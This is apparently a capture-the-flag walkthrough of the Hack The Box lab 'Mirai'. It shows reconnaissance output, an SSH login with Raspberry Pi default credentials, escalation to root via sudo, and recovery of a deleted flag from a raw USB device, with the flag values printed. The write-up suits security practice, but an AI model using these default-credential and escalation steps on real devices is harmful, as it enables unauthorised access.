# Mirai

| IP | Host |
| :--- | :--- |
| `10.129.97.64` | `mirai.htb` |

---

## 1. Reconnaissance

### Nmap

```bash
sudo nmap -sS -A -T4 --top-ports 1000 --reason -v -oA scan-10.129.97.64 10.129.97.64
```

```text
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey:
|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)
53/tcp    open  domain  syn-ack ttl 63 dnsmasq 2.76
| dns-nsid:
|_  bind.version: dnsmasq-2.76
80/tcp    open  http    syn-ack ttl 63 lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
1454/tcp  open  upnp    syn-ack ttl 63 Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
32400/tcp open  http    syn-ack ttl 63 Plex Media Server httpd
|_http-cors: HEAD GET POST PUT DELETE OPTIONS
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Unauthorized
|_http-favicon: Plex
32469/tcp open  upnp    syn-ack ttl 63 Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)

Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Uptime guess: 0.002 days (since Thu Nov  5 06:10:35 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   79.46 ms 10.10.14.1
2   79.81 ms 10.129.97.64
```

### /etc/hosts

```bash
echo 10.129.97.64 mirai.htb | sudo tee -a /etc/hosts
```

### HTTP headers

```bash
curl -I http://mirai.htb
```

```text
HTTP/1.1 200 OK
X-Pi-hole: A black hole for Internet advertisements.
Content-type: text/html; charset=UTF-8
Date: Thu, 05 Nov 2026 11:33:34 GMT
Server: lighttpd/1.4.35
```

### Directory enumeration

```bash
feroxbuster -u http://mirai.htb/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt --filter-similar-to http://mirai.htb/__missing_739182 -d 2 -o ferox_mirai.txt
```

```text
301      GET        0l        0w        0c http://mirai.htb/admin => http://mirai.htb/admin/
```

---

## 2. SSH access

### Default credentials

use default login data:

| username | password |
| :--- | :--- |
| `pi` | `raspberry` |

### SSH

```bash
ssh pi@mirai.htb
```

### /etc/passwd

```bash
cat /etc/passwd
```

```text
root:x:0:0:root:/root:/bin/bash
...
pi:x:1000:1000:,,,:/home/pi:/bin/bash
...
```

### Sudo permissions

```bash
sudo -l
```

```text
Matching Defaults entries for pi on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

### User flag

```bash
cat Desktop/user.txt
```

```text
ff837707441b257a20e32199d7c8838d
```

---

## 3. Root access

### Root shell

```bash
sudo su -
```

### /root/root.txt

```bash
cat /root/root.txt
```

```text
I lost my original root.txt! I think I may have a backup on my USB stick...
```

---

## 4. USB recovery

### Mounted filesystems

```bash
mount
```

```text
...
/dev/sdb on /media/usbstick type ext4 (ro,nosuid,nodev,noexec,relatime,data=ordered)
...
```

### /media/usbstick/damnit.txt

```bash
cat /media/usbstick/damnit.txt
```

```text
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
-James
```

### Raw USB data

```bash
sudo strings /dev/sdb
```

```text
...
3d3e483143ff12ec505d026fa13e020b
...
```
